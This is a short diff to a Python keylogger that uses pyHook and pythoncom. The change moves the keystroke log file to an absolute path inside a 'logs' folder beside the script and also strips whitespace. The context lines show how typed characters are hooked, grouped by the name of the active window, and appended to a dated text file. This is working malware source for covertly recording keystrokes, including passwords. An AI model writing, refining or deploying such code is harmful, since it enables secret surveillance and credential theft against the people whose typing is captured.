@@ -12,15 +12,18 @@ import pyHook
 import pythoncom
 from datetime import datetime
 
-todays_date = datetime.now().strftime('%Y-%b-%d')
-file_name = './logs/' + todays_date + '.txt'
+import os
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
+todays_date = datetime.now().strftime('%Y-%b-%d')
+file_name =  todays_date + '.txt'
+file_path = os.path.join(BASE_DIR,'logs', file_name)
 line_buffer = ""  # current typed line before return character
 window_name = ""  # current window
 
 
 def SaveLineToFile(line):
-    todays_file = open(file_name, 'a+')  # open todays file (append mode)
+    todays_file = open(file_path, 'a+')  # open todays file (append mode)
     todays_file.write(line)  # append line to file
     todays_file.close()  # close todays file
 
@@ -31,7 +34,7 @@ def OnKeyboardEvent(event):
 
     # print 'KeyID:', event.KeyID, chr(event.KeyID) #pressed value
 
-    """if typing in new window"""  
+    """if typing in new window"""
     if(window_name != event.WindowName):  # if typing in new window
         if(line_buffer != ""):  # if line buffer is not empty
             line_buffer += '\n'
